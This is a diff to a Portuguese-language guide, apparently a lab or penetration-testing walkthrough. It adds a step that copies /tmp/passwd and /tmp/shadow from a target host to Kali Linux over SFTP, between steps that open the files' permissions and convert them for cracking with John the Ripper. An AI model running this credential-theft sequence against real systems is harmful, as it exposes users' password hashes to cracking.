@@ -78,6 +78,15 @@ chmod 666 /tmp/passwd
 chmod 666 /tmp/shadow
 "
 ```
+## Tranferir arquivos via SFTP para o Kali Linux
+```
+sftp user@192.168.122.202
+user@192.168.122.202's password: 
+Connected to 192.168.122.202.
+sftp> ls /tmp
+sftp> get /tmp/passwd
+sftp> get /tmp/shadow
+```
 ## Converter arquivos de hash para o formato compativel do John The Ripper (Kali Linux)
 ```
 unshadow passwd shadow > hashes-linux.txt
